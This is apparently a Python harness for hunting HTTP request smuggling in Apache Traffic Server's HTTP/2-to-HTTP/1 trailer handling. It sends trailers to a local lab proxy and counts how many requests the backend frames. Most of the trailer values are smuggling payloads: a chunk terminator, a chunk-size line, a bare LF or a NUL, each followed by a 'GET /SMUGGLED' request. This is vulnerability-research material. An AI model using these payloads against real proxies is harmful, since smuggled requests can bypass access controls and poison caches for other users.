"""ATS folds an H2 trailer into the H1 chunked body with an 'HTTP/1.0 0 ' prefix and an
ATS-computed chunk size. If ATS ever mis-sizes that chunk, the trailer bytes escape as a
smuggled request. Hunt: trailer values crafted to break the size computation (embedded
chunk terminator/size, bare-LF, NUL, length boundaries). A smuggle = the llhttp backend
frames >1 request. Each case also dumps the exact forwarded H1 so a size mismatch is visible."""
import os
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from phage.evo import genome as G
from phage.evo.driver_h2 import send_h2

HOST, PORT = "127.0.0.1", 8443
LOG = "logs/chunk_bk.log"
TAP = "logs/tap_ah.jsonl"


def sz(p):
    try:
        return os.path.getsize(p)
    except OSError:
        return 0


REQ = [(b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab")]


def probe(trailer_fields, label, body=b"HI", show=False):
    lo, to = sz(LOG), sz(TAP)
    g = [G.Headers(tuple(REQ + [(b":path", b"/t")]), end_stream=False),
         G.Data(body, end_stream=False),
         G.Headers(tuple(trailer_fields), end_stream=True)]
    send_h2(HOST, PORT, g, timeout=5.0, sni="lab")
    time.sleep(0.5)
    out = open(LOG, "rb").read()[lo:] if os.path.exists(LOG) else b""
    reqs = [l for l in out.split(b"\n") if l.startswith(b"REQ ")]
    flag = "  <<< SMUGGLE (llhttp framed >1)" if len(reqs) > 1 else ""
    print(f"[{label}] backend_reqs={len(reqs)}{flag}")
    for r in reqs:
        print(f"    {r.decode('latin1')}")
    if show or len(reqs) > 1:
        fwd = open(TAP, "rb").read()[to:] if os.path.exists(TAP) else b""
        print("    forwarded H1:\n" + fwd.decode("latin1"))


SMUG = b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"
if __name__ == "__main__":
    probe([(b"x-a", b"1")], "0 baseline trailer", show=True)
    probe([(b"x-b", b"\r\n0\r\n\r\n" + SMUG)], "1 embedded chunk-terminator")
    probe([(b"x-c", b"\r\n41\r\n" + SMUG)], "2 embedded chunk-size line")
    probe([(b"x-d", b"a\n" + SMUG)], "3 bare-LF in trailer value")
    probe([(b"x-e", b"a\x00" + SMUG)], "4 NUL in trailer value")
    probe([(b"x-f", b"A" * 4088 + b"\r\n0\r\n\r\n" + SMUG)], "5 long value + terminator")
    probe([(b"x-g", b"1"), (b"x-h", b"\r\n0\r\n\r\n" + SMUG)], "6 two trailers")
    probe([(b"transfer-encoding", b"chunked")], "7 trailer TE:chunked", show=True)
    probe([(b"content-length", b"0")], "8 trailer CL:0", show=True)
    print("\nDONE. Any <<< SMUGGLE, or a chunk-size that does not match the bytes, is the bug.")
